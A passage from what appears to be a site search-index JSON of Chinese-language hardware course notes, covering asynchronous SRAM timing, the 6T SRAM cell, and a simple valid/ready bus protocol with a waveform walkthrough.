\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8f93\u51fa\u200b\u5f15\u811a\u200b\u5904\u4e8e\u200b\u9ad8\u200b\u963b\u6001\u200b\u72b6\u6001\u200b\uff0c\u200b\u6240\u4ee5\u200b\u591a\u4e2a\u200b\u82af\u7247\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u4e00\u4e2a\u200b\u6570\u636e\u603b\u7ebf\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u540c\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u82af\u7247\u200b\u5728\u200b\u8f93\u51fa\u200b\uff1a</p> <p> </p> \u200b\u5728\u200b\u6df1\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u5f02\u6b65\u200b SRAM <p>\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6df7\u5408\u200b\u4e24\u79cd\u200b\u62fc\u63a5\u200b\u65b9\u6cd5\u200b\u3002</p>"},{"location":"hardware/async_sram.html#_5","title":"\u65f6\u5e8f","text":""},{"location":"hardware/async_sram.html#_6","title":"\u8bfb\u200b\u65f6\u5e8f","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u4e4b\u6240\u4ee5\u200b\u53eb\u505a\u200b\u5f02\u6b65\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5b83\u200b\u6ca1\u6709\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u3002\u200b\u6b64\u65f6\u200b\u8bfb\u200b\u65f6\u5e8f\u200b\u4f53\u73b0\u200b\u4e3a\u200b\uff0c\u200b\u63a7\u5236\u5668\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\uff0c\u200b\u5230\u200b\u5f02\u6b65\u200b SRAM \u200b\u7ed9\u51fa\u200b\u6570\u636e\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u4ee5\u200b IS61/64WV204816ALL \u200b\u5f02\u6b65\u200b SRAM \u200b\u82af\u7247\u200b \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bfb\u200b\u65f6\u5e8f\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> \u200b\u5f02\u6b65\u200b SRAM \u200b\u8bfb\u200b\u65f6\u5e8f\u200b\uff08\u200b\u56fe\u6e90\u200b ISSI Datasheet\uff09 <ul> <li>\\(t_{RC}\\)\uff1a\u200b\u8bfb\u200b\u5468\u671f\u65f6\u95f4\u200b\uff0c\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u5730\u5740\u200b\u4e0d\u53d8\u200b\uff0cMin 10ns</li> <li>\\(t_{AA}\\)\uff1a\u200b\u5730\u5740\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\uff0c\u200b\u6570\u636e\u200b\u5728\u200b\u5730\u5740\u200b\u6539\u53d8\u200b\u540e\u200b \\(t_{AA}\\) \u200b\u65f6\u95f4\u200b\u7ed9\u51fa\u200b\uff0cMax 10ns</li> <li>\\(t_{OHA}\\)\uff1aOutput Hold \u200b\u65f6\u95f4\u200b\uff0c\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u6570\u636e\u200b\u4e0d\u53d8\u200b\uff0cMin 2.5ns</li> </ul> <p>\u200b\u5728\u200b \\(t_{OHA}\\) \u200b\u7ed3\u675f\u200b\u5230\u200b \\(t_{AA}\\) \u200b\u7ed3\u675f\u200b\u4e2d\u95f4\u200b\u7684\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\uff0c\u200b\u8f93\u51fa\u200b\u6570\u636e\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/async_sram.html#_7","title":"\u5199\u200b\u65f6\u5e8f","text":"<p>\u200b\u5199\u200b\u65f6\u5e8f\u200b\u5219\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u79cd\u200b\u5199\u5165\u200b\u7684\u200b\u6761\u4ef6\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\u5176\u4e2d\u200b\u4e00\u79cd\u200b\uff1a</p> <p> </p> \u200b\u5f02\u6b65\u200b SRAM \u200b\u5199\u200b\u65f6\u5e8f\u200b\uff08\u200b\u56fe\u6e90\u200b ISSI Datasheet\uff09 <p>\u200b\u5199\u200b\u65f6\u5e8f\u200b\u4e2d\u200b\u6bd4\u8f83\u200b\u6838\u5fc3\u200b\u7684\u200b\u662f\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\uff0c\u200b\u76f8\u5bf9\u200b\u8fd9\u4e2a\u200b\u65f6\u95f4\u200b\u70b9\u200b\uff0c\u200b\u6709\u200b\u5982\u4e0b\u200b\u6bd4\u8f83\u200b\u91cd\u8981\u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\uff1a</p> <ul> <li>\\(t_{WC}\\)\uff1a\u200b\u5730\u5740\u200b\u9700\u8981\u200b\u4fdd\u6301\u200b \\(t_{WC}\\) \u200b\u7684\u200b\u65f6\u95f4\u200b\u4e0d\u53d8\u200b\uff0cMin 10ns</li> <li>\\(t_{AW}\\)\uff1a\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Setup \u200b\u65f6\u95f4\u200b\uff0cMin 8ns</li> <li>\\(t_{HA}\\)\uff1a\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Hold \u200b\u65f6\u95f4\u200b\uff0cMin 0ns</li> <li>\\(t_{PWE}\\)\uff1a<code>WE#</code> \u200b\u7ef4\u6301\u200b 0 \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0cMin 8ns</li> <li>\\(t_{SD}\\)\uff1a\u200b\u6570\u636e\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Setup \u200b\u65f6\u95f4\u200b\uff0cMin 6ns</li> <li>\\(t_{HD}\\)\uff1a\u200b\u6570\u636e\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u200b\u7684\u200b Hold \u200b\u65f6\u95f4\u200b\uff0cMin 0ns</li> <li>\\(t_{SA}\\)\uff1a\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b <code>WE#</code> \u200b\u7684\u200b\u4e0b\u964d\u200b\u6cbf\u200b\u7684\u200b Setup \u200b\u65f6\u95f4\u200b\uff0cMin 0ns</li> </ul>"},{"location":"hardware/async_sram.html#sram-cell","title":"SRAM Cell","text":"<p>\u200b\u5178\u578b\u200b\u7684\u200b SRAM Cell \u200b\u7531\u200b 6 \u200b\u4e2a\u200b\u6676\u4f53\u7ba1\u200b\u7ec4\u6210\u200b\uff0c\u200b\u5185\u90e8\u200b\u6784\u9020\u200b\u5982\u4e0b\u200b\u56fe\u200b\uff1a</p> <p> </p> 6T SRAM Cell \u200b\u5185\u90e8\u200b\u6784\u9020\u200b\uff08\u200b\u56fe\u6e90\u200b Berkeley EECS 151/251A Spring 2019\uff09 <p>\u200b\u5176\u4e2d\u200b M1 \u200b\u548c\u200b M2 \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b Inverter\uff0cM3 \u200b\u548c\u200b M4 \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b Inverter\uff0c\u200b\u4e24\u4e2a\u200b Inverter \u200b\u7ec4\u6210\u200b\u4e0b\u9762\u200b\u7684\u200b\u7b49\u4ef7\u200b\u7535\u8def\u200b\uff1a</p> <p> </p> SRAM Cell \u200b\u7684\u200b\u7535\u8def\u200b\uff08\u200b\u56fe\u6e90\u200b Berkeley EECS 151/251A Spring 2019\uff09 <p>\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b latch\uff0c\u200b\u53ef\u4ee5\u200b\u7a33\u5b9a\u200b\u5730\u200b\u4fdd\u5b58\u200b 1 bit \u200b\u7684\u200b\u6570\u636e\u200b\u3002M5 \u200b\u548c\u200b M6 \u200b\u4e24\u4e2a\u200b\u6676\u4f53\u7ba1\u200b\u662f\u200b\u7528\u6765\u200b\u5b9e\u73b0\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u7684\u200b\u3002\u200b\u5f53\u200b WL \u200b\u4f7f\u80fd\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cM5 \u200b\u548c\u200b M6 \u200b\u5bfc\u901a\u200b\uff0c\u200b\u6b64\u65f6\u200b BL \u200b\u548c\u200b Q \u200b\u5bfc\u901a\u200b\uff0cBLbar \u200b\u548c\u200b Qbar \u200b\u5bfc\u901a\u200b\u3002\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b BL \u200b\u548c\u200b BLbar \u200b\u8fdb\u884c\u200b\u8bfb\u5199\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html","title":"\u603b\u7ebf\u200b\u534f\u8bae","text":""},{"location":"hardware/bus_protocol.html#_2","title":"\u529f\u80fd","text":"<p>\u200b\u603b\u7ebf\u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u8fde\u63a5\u200b CPU \u200b\u548c\u200b\u5916\u8bbe\u200b\uff08\u200b\u5305\u62ec\u200b\u5185\u5b58\u200b\uff09\uff0c\u200b\u4e3a\u4e86\u200b\u66f4\u597d\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\u548c\u200b\u53ef\u200b\u590d\u7528\u200b\u6027\u200b\uff0c\u200b\u80fd\u5426\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u7edf\u4e00\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u4e2d\u200b CPU \u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4e00\u65b9\u200b\uff08\u200b\u53c8\u200b\u79f0\u4e3a\u200b master\uff09\uff0c\u200b\u5916\u8bbe\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u63a5\u6536\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4e00\u65b9\u200b\uff08\u200b\u53c8\u200b\u79f0\u4e3a\u200b slave\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u8981\u200b\u6dfb\u52a0\u200b\u5916\u8bbe\u200b\u3001\u200b\u6216\u8005\u200b\u66ff\u6362\u200b CPU \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u90fd\u200b\u4f1a\u200b\u53d8\u5f97\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u8bb8\u591a\u200b\u9002\u914d\u200b\u7684\u200b\u5de5\u4f5c\u91cf\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u9700\u8981\u200b\u5305\u62ec\u200b\u54ea\u4e9b\u200b\u5185\u5bb9\u200b\uff1f\u200b\u5bf9\u4e8e\u200b CPU \u200b\u6765\u8bf4\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u4f1a\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\uff0c\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\u5c31\u200b\u9700\u8981\u200b\u5c06\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u5230\u200b\u5185\u5b58\u200b\uff1a</p> <ol> <li>\u200b\u5730\u5740\u200b\uff08<code>addr</code>\uff09\uff1a\u200b\u4f8b\u5982\u200b 32 \u200b\u4f4d\u200b\u5730\u5740\u200b</li> <li>\u200b\u6570\u636e\u200b\uff08<code>w_data</code> \u200b\u548c\u200b <code>r_data</code>\uff09\uff1a\u200b\u5206\u522b\u200b\u662f\u200b\u5199\u200b\u6570\u636e\u200b\u548c\u200b\u8bfb\u6570\u636e\u200b\uff0c\u200b\u5bbd\u5ea6\u200b\u901a\u5e38\u200b\u4e3a\u200b 32 \u200b\u4f4d\u200b\u6216\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u91cf\u200b</li> <li>\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff08<code>we</code>\uff09\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b\u5199\u200b\uff0c\u200b\u4f4e\u200b\u8868\u793a\u200b\u8bfb\u200b</li> <li>\u200b\u5b57\u8282\u200b\u6709\u6548\u200b\uff08<code>be</code>\uff09\uff1a\u200b\u4f8b\u5982\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u5355\u5b57\u8282\u200b\u5199\u200b\uff0c\u200b\u867d\u7136\u200b <code>w_data</code> \u200b\u53ef\u80fd\u200b\u662f\u200b 32 \u200b\u4f4d\u200b\u5bbd\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u5199\u5165\u200b\u7684\u200b\u662f\u200b\u5176\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b</li> </ol> <p>\u200b\u9664\u4e86\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5185\u5bb9\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b CPU \u200b\u60f3\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b <code>valid</code> \u200b\u4fe1\u53f7\u200b\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4f4e\u200b\u8868\u793a\u200b\u4e0d\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u5916\u8bbe\u200b\u7684\u200b\u901f\u5ea6\u200b\u6bd4\u8f83\u6162\u200b\uff0c\u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u4fdd\u8bc1\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5916\u8bbe\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b <code>ready</code> \u200b\u4fe1\u53f7\u200b\uff1a\u200b\u5f53\u200b <code>valid=1 &amp;&amp; ready=1</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53d1\u9001\u200b\u5e76\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff1b\u200b\u5f53\u200b <code>valid=1 &amp;&amp; ready=0</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8868\u793a\u200b\u5916\u8bbe\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u51c6\u5907\u200b\u597d\u200b\uff0c\u200b\u6b64\u65f6\u200b CPU \u200b\u9700\u8981\u200b\u4e00\u76f4\u200b\u4fdd\u6301\u200b <code>valid=1</code> \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u7b49\u5230\u200b\u5916\u8bbe\u200b\u51c6\u5907\u200b\u597d\u540e\u200b\uff0c<code>valid=1 &amp;&amp; ready=1</code> \u200b\u8bf7\u6c42\u200b\u751f\u6548\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#_3","title":"\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae","text":"<p>\u200b\u7ed3\u5408\u200b\u4e0a\u6587\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5206\u522b\u200b\u5f97\u5230\u200b master \u200b\u548c\u200b slave \u200b\u7aef\u7684\u200b\u4fe1\u53f7\u200b\u5217\u8868\u200b\u3002\u200b\u7ea6\u5b9a\u200b\u5728\u200b\u547d\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\u7528\u200b <code>_o</code> \u200b\u8868\u793a\u200b\u8f93\u51fa\u200b\u3001<code>_i</code> \u200b\u8868\u793a\u200b\u8f93\u5165\u200b\uff0c\u200b\u90a3\u4e48\u200b master \u200b\u7aef\u200b\uff08CPU \u200b\u7aef\u200b\uff09\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li><code>clock_i</code>\uff1a\u200b\u65f6\u949f\u200b\u8f93\u5165\u200b</li> <li><code>valid_o</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b master \u200b\u60f3\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b</li> <li><code>ready_i</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b slave \u200b\u51c6\u5907\u200b\u597d\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b</li> <li><code>addr_o</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u5199\u200b\u7684\u200b\u5730\u5740\u200b</li> <li><code>we_o</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b</li> <li><code>data_o</code>\uff1amaster \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b</li> <li><code>be_o</code>\uff1amaster \u200b\u8bfb\u5199\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b\u5355\u5b57\u8282\u200b\u5199\u200b\u7b49\u200b</li> <li><code>data_i</code>\uff1aslave \u200b\u63d0\u4f9b\u200b\u7ed9\u200b master \u200b\u7684\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u9664\u4e86\u200b\u65f6\u949f\u200b\u90fd\u200b\u662f\u200b\u8f93\u5165\u200b\u4ee5\u5916\u200b\uff0c\u200b\u628a\u200b\u4e0a\u9762\u200b\u5176\u4f59\u200b\u7684\u200b\u4fe1\u53f7\u200b\u8f93\u5165\u200b\u3001\u200b\u8f93\u51fa\u200b\u5bf9\u79f0\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b slave \u200b\u7aef\u200b\uff08\u200b\u5916\u8bbe\u200b\u7aef\u200b\uff09\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li><code>clock_i</code>\uff1a\u200b\u65f6\u949f\u200b\u8f93\u5165\u200b</li> <li><code>valid_i</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b master \u200b\u60f3\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b</li> <li><code>ready_o</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b slave \u200b\u51c6\u5907\u200b\u597d\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b</li> <li><code>addr_i</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u5199\u200b\u7684\u200b\u5730\u5740\u200b</li> <li><code>we_i</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b</li> <li><code>data_i</code>\uff1amaster \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b</li> <li><code>be_i</code>\uff1amaster \u200b\u8bfb\u5199\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b\u5355\u5b57\u8282\u200b\u5199\u200b\u7b49\u200b</li> <li><code>data_o</code>\uff1aslave \u200b\u63d0\u4f9b\u200b\u7ed9\u200b master \u200b\u7684\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u4ee5\u200b\u4e0a\u9762\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u7ed8\u5236\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b\uff08\u200b\u4ee5\u200b master \u200b\u7684\u200b\u4fe1\u53f7\u200b\u4e3a\u4f8b\u200b\uff09\uff1a</p> \u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b <ul> <li><code>a</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0c\u200b\u6b64\u65f6\u200b <code>we_o=1</code> \u200b\u8bf4\u660e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5199\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5199\u5165\u200b\u5730\u5740\u200b\u662f\u200b <code>addr_o=0x01</code>\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b <code>data_o=0x12</code></li> <li><code>b</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=0 &amp;&amp; ready_i=0</code> \u200b\u8bf4\u660e\u200b\u65e0\u200b\u4e8b\u200b\u53d1\u751f\u200b</li> <li><code>c</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=0</code> \u200b\u8bf4\u660e\u200b master \u200b\u60f3\u8981\u200b\u4ece\u200b\u5730\u5740\u200b 0x02\uff08<code>addr_o=0x02</code>\uff09\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08<code>we_o=0</code>\uff09\uff0c\u200b\u4f46\u662f\u200b slave \u200b\u6ca1\u6709\u200b\u63a5\u53d7\u200b\uff08<code>ready_i=0</code>\uff09</li> <li><code>d</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u4ece\u200b\u5730\u5740\u200b 0x02\uff08<code>addr_o=0x02</code>\uff09\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08<code>we_o=0</code>\uff09\uff0c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x34\uff08<code>data_i=0x34</code>\uff09</li> <li><code>e</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=0 &amp;&amp; ready_i=0</code> \u200b\u8bf4\u660e\u200b\u65e0\u200b\u4e8b\u200b\u53d1\u751f\u200b</li> <li><code>f</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u5411\u200b\u5730\u5740\u200b 0x03\uff08<code>addr_o=0x03</code>\uff09\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff08<code>we_o=1</code>\uff09\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x56\uff08<code>data_i=0x56</code>\uff09</li> <li><code>g</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u4ece\u200b\u5730\u5740\u200b 0x01\uff08<code>addr_o=0x01</code>\uff09\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff08<code>we_o=0</code>\uff09\uff0c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x12\uff08<code>data_i=0x12</code>\uff09</li> <li><code>h</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8bf4\u660e\u200b\u6709\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b\uff0cmaster \u200b\u5411\u200b\u5730\u5740\u200b 0x02\uff08<code>addr_o=0x02</code>\uff09\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff08<code>we_o=1</code>\uff09\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b 0x9a\uff08<code>data_i=0x9a</code>\uff09</li> </ul> <p>\u200b\u89c2\u5bdf\u200b\u4e0a\u9762\u200b\u7684\u200b\u6ce2\u5f62\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u51e0\u6761\u200b\u89c4\u5f8b\u200b\uff1a</p> <ol> <li>master \u200b\u60f3\u8981\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u8bbe\u7f6e\u200b <code>valid_o=1</code>\uff1b\u200b\u5f53\u200b slave \u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u8bbe\u7f6e\u200b <code>ready_i=1</code>\uff1b\u200b\u5728\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u65f6\u200b\u89c6\u4e3a\u200b\u4e00\u6b21\u200b\u8bf7\u6c42\u200b</li> <li>\u200b\u5982\u679c\u200b master \u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u540c\u65f6\u200b slave \u200b\u4e0d\u80fd\u200b\u63a5\u6536\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b <code>valid_o=1 &amp;&amp; ready_i=0</code>\uff0c\u200b\u6b64\u65f6\u200b master \u200b\u8981\u200b\u4fdd\u6301\u200b <code>addr_o</code> <code>we_o</code> <code>data_o</code> \u200b\u548c\u200b <code>be_o</code> \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u76f4\u5230\u200b\u8bf7\u6c42\u200b\u7ed3\u675f\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b</li> <li>\u200b\u5f53\u200b master \u200b\u4e0d\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5373\u200b <code>valid_o=0</code>\uff0c\u200b\u6b64\u65f6\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u89c6\u4e3a\u200b\u65e0\u6548\u200b\u6570\u636e\u200b\uff0c\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\uff1b\u200b\u5bf9\u4e8e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ea\u6709\u200b\u5728\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u65f6\u200b <code>data_i</code> \u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u6709\u6548\u200b\u7684\u200b</li> <li>\u200b\u53ef\u4ee5\u200b\u8fde\u7eed\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u53d1\u751f\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b <code>valid_o=1 &amp;&amp; ready_i=1</code> \u200b\u8fde\u7eed\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u7b49\u4e8e\u200b\u4e00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u662f\u200b\u7406\u60f3\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b\u603b\u7ebf\u200b\u6700\u9ad8\u200b\u7684\u200b\u4f20\u8f93\u901f\u5ea6\u200b</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7b80\u6613\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#wishbone","title":"Wishbone","text":"<p>Wishbone 